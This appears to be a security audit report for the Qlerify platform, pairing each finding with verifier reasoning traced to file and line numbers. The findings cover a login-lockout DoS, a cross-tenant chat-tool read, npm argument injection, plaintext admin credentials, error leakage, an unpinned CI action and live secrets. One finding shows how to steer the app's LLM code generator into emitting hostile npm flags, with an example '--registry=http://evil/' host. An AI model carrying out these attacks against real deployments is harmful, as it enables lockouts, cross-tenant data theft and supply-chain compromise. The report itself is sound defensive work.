verifier_reasoning: (confirmed) Every link in the finding is verified against the code. resolveSuperadminCredential (src/platform/provisioning/index.ts:604) returns `plaintext: env` whenever SUPERADMIN_PASSWORD is set, not only the first-boot random case. seedSuperuser (src/platform/provisioning/index.ts:639-657) calls writeFileSync(join(QLERIFY_DIR,"superadmin.local.txt"), ...cred.plaintext...) whenever cred.plaintext is truthy; the NODE_ENV==="production" check at line 640 gates ONLY the console.warn, not the file write, and line 652 has a dedicated "From SUPERADMIN_PASSWORD" branch — so the operator-managed secret is intentionally written on every boot. The superuser is a global break-glass admin: src/platform/pdp/index.ts:165-171 grants actingAsPlatformAdmin administer/edit/view in ANY non-member org, so the file is a full cross-tenant god credential. The only thing that lowers severity is reachability: this is not remotely/pre-auth exploitable on its own — reading the file requires a secondary path into /data (backup/snapshot operator, sidecar sharing the mount, restored volume image, or a separate arbitrary-file-read bug). The weakness (plaintext storage of the highest-privilege credential at rest, defeating an operator who deliberately uses a secret manager) is real and exactly as described. || (confirmed) The described behavior is real and there is no upstream guard that defeats it. resolveSuperadminCredential (src/platform/provisioning/index.ts:604) returns `plaintext: env` for ANY truthy SUPERADMIN_PASSWORD, not just the first-boot random case. seedSuperuser (index.ts:639-657) then calls writeFileSync(join(QLERIFY_DIR,"superadmin.local.txt"), "...password: "+cred.plaintext) unconditionally whenever cred.plaintext is set — the only conditional (line 640) gates a console.warn, not the write. So the operator-managed env secret IS written to disk on every boot. title: Per-subject login throttle enables a sustained targeted account login lockout (DoS)
cwe: CWE-645: Overly Restrictive Account Lockout Mechanism
description: The login handler checks the limiter BEFORE attempting verification: `const gate = loginRateLimiter.check(ip, subject); if (gate.blocked) return reply.code(429)...` (control-routes.ts:178-183). The per-subject window is tight (MAX_PER_SUBJECT=8 / 5 min) and is only reset on a SUCCESSFUL login (rate-limit.ts:113 `recordSuccess` → `this.subject.reset`). Because the block is evaluated before the password is ever checked, once an attacker fills a victim's subject bucket the victim's own correct-password attempt is rejected with 429 before it can reach the success/reset path — so the legitimate user cannot self-heal the throttle during an active attack.
attack_scenario: An attacker who knows a target username submits 8 wrong passwords for `subject=alice` within 5 minutes (no valid credential required, and — since trustProxy is unset and req.ip is the socket IP — even a single host suffices for the subject bucket). Alice's subject bucket stays full; her correct-password logins return 429 for the window. Repeating ~8 bad attempts every 5 minutes keeps Alice locked out of sign-in indefinitely. Aimed at an org owner/admin, this is a denial of administrative access.
recommendation: This is the documented availability tradeoff of per-account throttling, but consider: (a) not counting the attempt that would otherwise succeed (verify first, throttle only confirmed failures), or (b) adding a short, escalating per-subject delay rather than a hard 429 that pre-empts a valid credential, or (c) exempting a correct credential from the block. Document the residual risk for the on-prem operator.
exploitability: Pre-auth, no credentials needed; reachable by anyone who can hit /v1/auth/login and knows the victim's username (subject). Single source IP suffices (8 failures/5min << per-IP cap of 30/5min). Availability-only: no data exposure, no privilege escalation, no integrity/RCE impact. Fully recoverable — the in-memory sliding window self-heals when the attack stops and clears on process restart; the on-prem operator can also tune/disable LOGIN_RATELIMIT_SUBJECT_MAX. Classic CWE-645 per-account-lockout DoS / documented throttling tradeoff.
verifier_reasoning: (confirmed) The exploit works as described. (1) /v1/auth/login is a public, pre-auth endpoint — tenant-plugin.ts:39 (`if (url.startsWith("/v1/auth/")) return true;`) exempts it from tenant/identity resolution, and the subject bucket is keyed solely on the attacker-supplied `subject` string (rate-limit.ts:100,108), so no credential is required to fill a victim's bucket. (2) The block is evaluated before password verification: control-routes.ts:178-183 calls loginRateLimiter.check(ip, subject) and returns 429 immediately on `gate.blocked`. The ONLY path that resets the subject window is recordSuccess → this.subject.reset (control-routes.ts:196, rate-limit.ts:113-114), which sits on the success branch AFTER the block check. Therefore a victim submitting the correct password is rejected at control-routes.ts:179 and never reaches the reset — the documented "reset-on-success self-heal" (rate-limit.ts:9-16) cannot help while the bucket is full. (3) The attack is sustainable from a single host: SlidingWindowLimiter.check blocks when hits.length >= max (rate-limit.ts:56) with MAX_PER_SUBJECT=8 (rate-limit.ts:23); attempt #9 is short-circuited before recordFailure (control-routes.ts:192 is after the 429 return), so the bucket caps at 8 and never trips the attacker's own IP limit of 30/5min (rate-limit.ts:24,102). Topping up ~8 failures per 5-min window (or one every ~37s to keep it pinned) holds a known victim's subject bucket full indefinitely, returning 429 to their correct-password logins. Aimed at an org owner/admin (whose username is typically a known email) this denies administrative sign-in for as long as the attacker persists. || (confirmed) The mechanism is real and I found no upstream guard defeating it. (1) The login route is reachable pre-auth: tenant-plugin.ts:39 exempts `/v1/auth/` from the auth hooks, so no credential/session is needed. (2) control-routes.ts:178-183 calls `loginRateLimiter.check(ip, subject)` and returns 429 BEFORE any password verification; the success/reset path is only reached at control-routes.ts:196. (3) The subject bucket blocks at >=8 hits/5min (rate-limit.ts:23, rate-limit.ts:56) and is only cleared by recordSuccess→subject.reset (rate-limit.ts:113-114), which a 429'd legitimate user can never reach — so the victim cannot self-heal during the attack. (4) No CAPTCHA, no correct-credential exemption, no soft-delay alternative. The attack does not depend on trustProxy/req.ip because the subject bucket is keyed on the username, not the IP, and blocked attempts are 429'd before recordFailure (control-routes.ts:179-192), so a single host can keep topping up the subject bucket (~8 records/5min) without tripping its own IP limit (MAX_PER_IP=30, rate-limit.ts:24). The file header's claim that the legitimate path "can't trip its own throttle" (rate-limit.ts:12-13) only covers self-inflicted failures, not a third party filling the bucket. Bounding nuance: the window slides (self-heals in 5min once the attacker stops) and a single victim slip-through triggers recordSuccess which resets the whole subject bucket, so the lockout is probabilistic/degrading rather than a hard permanent lock — which is why this stays low, not higher.

title: Chat get_event_log tool omits the org/workflow predicate, allowing cross-tenant event reads by caseId
cwe: CWE-862 Missing Authorization
attack_scenario: An attacker who learns another tenant's caseId (e.g. via the cross-tenant adapter/connector enumeration in the findings above, logs, or a shared export) issues a chat turn that calls get_event_log with that caseId and reads the foreign case's event stream, which is otherwise invisible to their org.
recommendation: Add `...eventLogOrgWhere()` to the where clause in handleGetEventLog, matching every other EventLog read, so a foreign/known caseId resolves to nothing outside the caller's workflow.
exploitability: Requires an authenticated user in some org (not pre-auth) who already knows a foreign caseId — caseIds are random newId values and are NOT enumerable from this endpoint, so the id must be learned out-of-band (logs, shared export, or the separate connector-enumeration finding). Given a known foreign caseId, the attacker issues a chat turn that triggers get_event_log and reads that case's event stream cross-tenant. Projection is metadata-only (eventName, eventRef, boundedContext, role, businessAt, occurredAt) — no raw business-payload column — so it confirms existence and leaks event-step names/roles/timing of another org's case rather than full payload. Cross-tenant authz break, attenuated by the unguessable id and limited select.
verifier_reasoning: (confirmed) handleGetEventLog (src/chat/tools.ts:486-493) runs prisma.eventLog.findMany({ where: { caseId }, ... }) with NO tenant predicate. Every other EventLog read folds in eventLogOrgWhere() (src/platform/tenancy/event-scope.ts:14 → { workflowId, organizationId }): routes.ts:160, sim.ts:328/360/361/371, derive.ts:416, correlate.ts:126. The sibling chat read tools are scoped — get_case_details→genericInstanceDetail (sim.ts:371) and list_cases→genericListInstances (sim.ts:360-361) both fold it in — so get_event_log is the lone exception. The /chat route (routes.ts:339) is post-auth behind the deny-by-default tenant plugin (tenant-plugin.ts:51-71); org/workflow context comes from resolved identity, not input. caseId is fully attacker-controlled via the tool input schema (tools.ts:94). Read tools are absent from TOOL_WRITE_ACTIONS (tools.ts:31-42), so guardData is never called and there is no caseId→workflow ownership check. emit() stamps each row with the writing org's workflowId/organizationId, so a foreign caseId returns another org's rows. Real CWE-862 cross-tenant missing-authz. || (confirmed) The finding is real. src/chat/tools.ts:486-493 (handleGetEventLog) runs `prisma.eventLog.findMany({ where: { caseId }, ... })` with no tenant predicate, while every other EventLog read in the codebase folds in eventLogOrgWhere() (src/http/routes.ts:160; src/twin/sim.ts:152,236,328,341,346,360-361,371; src/twin/derive.ts:416,474; src/http/bc-routes.ts:30,196,264). eventLogOrgWhere() (src/platform/tenancy/event-scope.ts:14-22) is what adds {workflowId, organizationId} from the ALS request context. I checked for an upstream mitigation and found none: (1) src/db.ts:1-11 is a plain PrismaClient with no $use/$extends middleware, so there is no automatic/RLS scoping — isolation depends entirely on the explicit where clause this handler omits. (2) The /chat route (src/http/routes.ts:339) is auth-gated and tenant-bound (src/platform/http/tenant-plugin.ts:51-79), but read tools have NO read-side PDP — runTool only gates TOOL_WRITE_ACTIONS (src/chat/tools.ts:31-42,383-384), and the design comment explicitly says reads stay "membership-scoped," i.e. they rely on the data-plane eventLogOrgWhere() scoping that this one handler drops. (3) No pre-validation of caseId against the active workflow before the query. Because the authenticated user drives the chat input, they can directly cause get_event_log to be invoked with any caseId (no prompt-injection required) — a straightforward IDOR. A foreign caseId from another org/workflow therefore returns that case's rows. The vulnerability is exactly as described.

title: npm argument injection: scanImports passes import specifiers beginning with '-' straight into the npm install argv
cwe: CWE-88: Argument Injection
description: `scanImports` extracts package specifiers from AI-generated connector code and feeds them to `spawn("npm", ["install", ...missing, ...])` (installDeps, line 303-304). The only filtering is `if (raw.startsWith(".") || raw.startsWith("/") || raw.startsWith("node:")) continue;` (line 275) — specifiers beginning with `-` are NOT rejected, so `import x from "--some-flag"` becomes an npm CLI flag rather than a package. spawn does not use a shell, but npm itself parses these as options (e.g. `-g`, `--registry=...` style flags). The blast radius is limited because the hardcoded `--ignore-scripts` is appended AFTER the injected tokens (so lifecycle-script RCE stays disabled by option ordering) and because specifiers containing `/` get mangled by `raw.split("/")`, but the input is unvalidated and the protection is brittle.
attack_scenario: AI-authored connector code (steerable via build_connector instructions) contains an import like `import a from "-g"` alongside a real package, yielding `npm install -g <pkg> ...` (global install into a system prefix) or other no-value npm flags; should the ordering invariant on `--ignore-scripts` ever change, this becomes a lifecycle-script RCE vector since the install spawn itself runs unsandboxed with full filesystem access.
recommendation: Validate every specifier against a strict npm package-name regex (optional `@scope/`, then name, optional subpath) before passing it to `npm install`, rejecting anything starting with `-` or containing protocol/URL/path syntax. Prefer `npm install --` to terminate option parsing and pass packages positionally.
exploitability: Authenticated, trusted-operator only. Requires (1) a resolved tenant context with an org owner/editor grant — guardData("connector.edit") at chat/tools.ts:383-384 → authz.ts:45-59 fails closed for viewers/unauthenticated; (2) the connector subsystem enabled (connectorsEnabled gate, authz.ts:49); and (3) steering the LLM via build_connector `instructions` to emit a `-`-prefixed import. Not reachable pre-auth, not cross-tenant. No script-RCE: `--ignore-scripts` is appended after the injected tokens (runtime.ts:303) and the run-time module is executed in the sandboxed child (D1-D4), so installing an arbitrary/global package yields no automatic code execution and no secret access. Net effect is defense-in-depth hardening, not a privilege-boundary break.
verifier_reasoning: (confirmed) The argument-injection primitive is real and the finding describes the code accurately. In src/packs/connector/runtime.ts:275 the only specifier filtering is `if (raw.startsWith(".") || raw.startsWith("/") || raw.startsWith("node:")) continue;` — a `-`-prefixed import like `import x from "-g"` survives (parts=["-g"], pkg="-g", not a NODE_BUILTIN, so specs.add("-g")). That value flows verbatim into installDeps (runtime.ts:292-304): `want`/`missing` keep it (isInstalled("-g") is false at runtime.ts:286), and it is spliced into `["install", ...missing, "--no-audit", ...]` passed to `spawn("npm", args, …)` at line 303-304. spawn uses no shell, but npm's own option parser treats `-g`/`-f`/etc. as CLI flags, so AI-authored connector code can inject npm options — textbook CWE-88. Concrete attack: an authenticated user with `connector.edit` on a workflow calls `build_connector` (chat/tools.ts:38,422-423) with instructions steering the LLM to emit `import a from "-g"; import lodash from "lodash";`; generateConnectorModule (codegen.ts:301-315) returns deps `["-g","lodash"]`, and buildConnector (orchestrate.ts:185) runs `npm install -g lodash --no-audit --no-fund --ignore-scripts --loglevel=error --save` — a global install instead of a local one. The finding's own caveats hold and are load-bearing: the hardcoded `--ignore-scripts` is appended LAST (runtime.ts:303) so a later boolean wins in npm/nopt and lifecycle-script RCE stays disabled; specifiers containing `/` are mangled by `raw.split("/")` (line 276-277), so URL/registry/path-style value-bearing flags collapse to harmless tokens (e.g. `--registry=http://evil/` → `--registry=http:`); and the install env is stripped to `{PATH,HOME}` (line 304) with no secrets. So no RCE and no secret exfil — the realized impact is limited to benign/erroring npm flag injection (global/forced install, malformed invocations). It is a genuine but low-impact defect, exactly as the finder rated it. || (confirmed) The argument injection is genuinely present, not a false positive. scanImports (src/packs/connector/runtime.ts:275) only skips specifiers starting with ".", "/", or "node:" — there is NO rejection of "-"-prefixed tokens. I traced "-g": startsWith filter passes, parts=["-g"], pkg="-g", not a NODE_BUILTIN, so it is added to the dep set. installDeps (runtime.ts:292-304) feeds the set straight into spawn("npm",["install",...missing,"--no-audit","--no-fund","--ignore-scripts","--loglevel=error","--save"]) with no validation. The code being scanned is AI-generated (codegen.ts:301-315) from a prompt containing user-controlled `instructions`/`errorReport`, so a caller can steer the AI to emit `import a from "-g"`. I looked for the upstream guard the REFUTE lens expects and could not find one: gen.deps flows directly to installDeps in buildConnector (orchestrate.ts:178-185) with no sanitizer in between. However, the listed mitigations are real and hold: spawn() is shell-less; the hardcoded `--ignore-scripts` is always appended AFTER the injected tokens (npm/nopt last-wins, so an injected `--ignore-scripts=false` is overridden and lifecycle RCE stays disabled); any flag containing "/" (`--registry=`, `--prefix=`, URLs) is mangled by raw.split("/") into a broken token; and the install env is stripped to PATH+HOME. Net realistic impact: attempt a global install (`-g`) or force the connector build's npm install to fail (mild DoS), with no script execution, no secret exfil, no cross-tenant escalation. So the defect is real but low-impact defense-in-depth, exactly as the finding rates it.

title: Superuser password persisted in a cleartext file with default (group/other-readable) permissions, even when operator-supplied via env
cwe: CWE-256: Plaintext Storage of a Password
description:
seedSuperuser writes the platform superuser (god-account) password to `.qlerify/superadmin.local.txt` in cleartext with no explicit file mode (defaults to ~0644 under typical umask, i.e. readable by every local user/process):

```
writeFileSync(
  join(QLERIFY_DIR, "superadmin.local.txt"),
  `Qlerify Platform — superuser account\nusername: ${SUPERADMIN_SUBJECT}\npassword: ${cred.plaintext}\n` + ...
);
```

The file is written whenever a password is set this boot — including when the operator already supplied it securely via `SUPERADMIN_PASSWORD` (resolveSuperadminCredential returns `plaintext: env`, line 604), so the recommended 'set it in env' path still drops the cleartext credential onto the persisted volume on every reboot. On a multi-user on-prem host this exposes the most privileged credential to any local account, backup, or container with filesystem read; the file persists indefinitely on the /data volume.
attack_scenario: Operator deploys on-prem with SUPERADMIN_PASSWORD set in env (the documented secure approach). On boot the server still writes /data/qlerify/superadmin.local.txt (mode 0644) containing the plaintext superadmin password. A low-privileged local user, a volume snapshot/backup copied off-box, or a co-tenant process reads the file and obtains break-glass platform-admin access to every organization.
recommendation: Write the credentials file with mode 0600 (fd opened with O_CREAT and explicit mode), and only when the password was auto-generated (cred.generated) — never re-persist an operator-supplied SUPERADMIN_PASSWORD. Consider emitting the generated password once to stderr/console for the operator instead of leaving it at rest, and delete the file after first successful sign-in.

title: Global error handler returns raw err.message on 500 responses (internal error / SQL detail disclosure)
cwe: CWE-209: Generation of Error Message Containing Sensitive Information
description: The Fastify error handler safety-net sends the raw error message to the client for ALL errors, including unhandled 500s: `return reply.code(status).send({ error: (err as any)?.code ?? "INTERNAL", message: (err as any)?.message });` (src/server.ts:85). Handled domain errors are fine, but any unexpected infra error that bubbles here (e.g. a Prisma error, or a SQLite error raised from the raw-SQL projection layer that builds gen_ tables via $queryRawUnsafe/$executeRawUnsafe) returns its internal message verbatim.
attack_scenario: An authenticated tenant user crafts input that reaches a raw-SQL sink or a Prisma constraint with no local try/catch; the 500 response body contains the underlying engine message (SQL fragment, column/table identifiers, Prisma/SQLite internals). This leaks schema and internal structure useful for further attacks and is below the disclosure bar expected for a high-security multi-tenant deployment.
recommendation: For status >= 500 return a generic body (`{ error: "INTERNAL", message: "internal error" }`) and log the real message/stack server-side only. Keep returning specific messages solely for the typed handled-error 4xx cases.
exploitability: Mostly requires an authenticated tenant user who crafts input that reaches a raw-SQL sink or a Prisma/SQLite constraint with no local try/catch (the data plane is deny-by-default, so most sinks are post-auth). A narrow pre-auth surface exists via the tenant-plugin onRequest DB lookups (tenant-plugin.ts:51) if they raise an untyped infra error before auth resolves. Impact is limited to disclosure of internal error text — SQL fragments, gen_ table/column identifiers, SQLite/Prisma internals. No auth bypass, no cross-tenant row read (queries are org-scoped via orgFilterSql), no RCE. Defense-in-depth / information-disclosure hardening, consistent with the finding's low rating for an on-prem Ericsson install.
verifier_reasoning:
(confirmed) The code reads exactly as the finding states. src/server.ts:79-86 is the Fastify global error handler. After the handled-error branch (src/server.ts:80-81, which is fine — those are typed 4xx DomainError/AuthError/etc. from src/errors.ts), the fall-through at src/server.ts:85 does `return reply.code(status).send({ error: (err as any)?.code ?? "INTERNAL", message: (err as any)?.message });`. For status >= 500 (or any untyped error with no statusCode, which defaults to 500 at src/server.ts:83) the raw `err.message` is sent verbatim to the client. The server-side log at src/server.ts:84 is correct, but the response body still leaks the message.

Reachability is real, not theoretical. The projection layer (src/twin/projection-store.ts) is full of raw-SQL sinks via prisma.$executeRawUnsafe / $queryRawUnsafe (insert at :271, update at :292, findById/findMany/countRows, etc.). These throw on any infra fault: e.g. update() explicitly does `throw new Error(\`stale write on ${table} ${id}\`)` (projection-store.ts:296) — a plain Error with no statusCode, so it hits the 500 branch and returns the logical table name + id. SQLite constraint failures (UNIQUE/NOT NULL/type) from insert() carry messages containing the physical `gen_<entity>` table and column identifiers; Prisma engine errors carry internal detail. None of these are DomainError instances, so isHandledError (errors.ts:57) returns false and they fall through to src/server.ts:85. There is also a pre-auth sliver: the tenant-plugin onRequest hook (src/platform/http/tenant-plugin.ts:51) performs DB lookups to resolve context before auth completes; an infra error there would likewise be returned raw to an unauthenticated caller.

So the disclosure is confirmed: internal SQL/engine error text (schema identifiers, SQLite/Prisma internals) is returned to the caller on 500s. This is precisely CWE-209. The recommendation (generic body for status >= 500, log real detail server-side only) is the correct fix. || (confirmed) The cited behavior is real and unmitigated. src/server.ts:85 returns `message: (err as any)?.message` to the client for every non-handled error, including 500s; the preceding `if (status >= 500) req.log.error(...)` (line 84) only logs server-side, it does not stop the raw message being sent. There is no sanitizer, no production/NODE_ENV gate, and no response-schema filtering between the throw and the reply — this is the only setErrorHandler in the tree (grep confirms). Lens-B mitigation search found nothing: isHandledError (src/errors.ts:57) only covers the typed domain errors, and the else-branch deliberately forwards err.message. So the finding stands as a CWE-209 internal-error/SQL-detail disclosure.

title: CI deploy job uses an unpinned third-party action (@master) while holding FLY_API_TOKEN
cwe: CWE-1357: Reliance on Insufficiently Trustworthy Component
description: The deploy job references `uses: superfly/flyctl-actions/setup-flyctl@master` (.github/workflows/fly-deploy.yml:32) — a moving branch ref, not a pinned commit SHA — in a job whose env exposes `FLY_API_TOKEN: ${{ secrets.FLY_API_TOKEN }}` (line 37). The job runs automatically on every push to main.
attack_scenario: If the upstream action's master branch is compromised (or the upstream account is taken over), the next push to main runs attacker-controlled code in the deploy runner with FLY_API_TOKEN in scope; the token is exfiltrated, giving the attacker control of the qlerify-live Fly deployment (redeploy a backdoored image, read/modify the volume). Unpinned third-party actions are below the supply-chain bar for a high-security pipeline.
recommendation: Pin all third-party actions to a full commit SHA (and ideally vendor/review them). actions/checkout and setup-node are pinned to v4 tags — prefer SHAs there too. Consider an environment-protection rule / manual approval gate on the deploy job.
exploitability: Not reachable by any application user — not pre-auth, not cross-tenant, no application RCE. Exploitation requires a precondition fully outside the attacker's control: subverting the upstream `superfly/flyctl-actions` master branch or taking over the `superfly` GitHub org (the official Fly.io vendor — effectively a first-party action from qlerify's own deploy provider, not an arbitrary third party). If that upstream is compromised, the next push to main runs attacker code that captures the production FLY_API_TOKEN. This is a defense-in-depth / supply-chain hardening gap; the standard fix (pin to a full commit SHA, optionally an environment-protection/manual-approval gate on the deploy job) applies. Severity low is correct.
verifier_reasoning: (confirmed) The cited facts are accurate. .github/workflows/fly-deploy.yml:32 uses `uses: superfly/flyctl-actions/setup-flyctl@master` — a mutable moving branch ref, not a pinned commit SHA. The workflow triggers `on: push: branches: [main]` (lines 4-5), running automatically on every push to main. FLY_API_TOKEN is exposed at line 37. The finder slightly misstated scope: the `env:` block (lines 36-37) is indented under the `- run: flyctl deploy` step (line 35), so FLY_API_TOKEN is step-scoped, NOT job-scoped, and is therefore NOT in the setup-flyctl step's own environment. However this does not mitigate the attack: setup-flyctl's job is to install the `flyctl` binary that the very next step (line 35) invokes with the token present. A compromised @master action installs a trojaned flyctl / poisons PATH, which then runs at line 35 with FLY_API_TOKEN in scope and exfiltrates it — yielding control of the Fly deployment (redeploy backdoored image, read/modify the volume). The weakness is real (CWE-1357). No upstream guard mitigates it: there is no SHA pin, no environment-protection/approval gate on the deploy job, and the `concurrency`/`needs: typecheck` controls do nothing for supply-chain trust. Note actions/checkout@v4 and setup-node@v4 (lines 18,19,31) are also mutable tags but GitHub-maintained (lower risk), as the finding acknowledges. || (confirmed) The finding is factually accurate and no upstream mitigation defeats it. .github/workflows/fly-deploy.yml:32 is `uses: superfly/flyctl-actions/setup-flyctl@master` — an unpinned moving branch ref — and it sits in the `deploy` job (lines 27-35) whose `flyctl deploy` step exposes `FLY_API_TOKEN: ${{ secrets.FLY_API_TOKEN }}` (line 37). The job runs automatically on every push to main (lines 3-5). By contrast actions/checkout@v4 and actions/setup-node@v4 (lines 18-19, 31) are at least tag-pinned, but the third-party `superfly` action is a bare `@master`. So the supply-chain weakness is real as described — not a false positive. However the exploitability is contingent: it is not attacker-triggerable directly; it requires a prior compromise of the upstream superfly/flyctl-actions repo (branch push or account takeover), after which the next main push exfiltrates FLY_API_TOKEN. This is a defense-in-depth supply-chain hardening gap affecting Qlerify's own Fly deployment, not a pre-auth/cross-tenant/RCE in the application.

title: Live ANTHROPIC_API_KEY and PLATFORM_ENCRYPTION_KEY (master secret) present in plaintext in the working-tree .env

description: The on-disk .env contains a real live Anthropic key (`ANTHROPIC_API_KEY=sk-ant-api03-...`, .env:14) and a real 32-byte master key (`PLATFORM_ENCRYPTION_KEY=194c24a8...`, .env:17) — the latter encrypts every org's at-rest BYOK secrets.
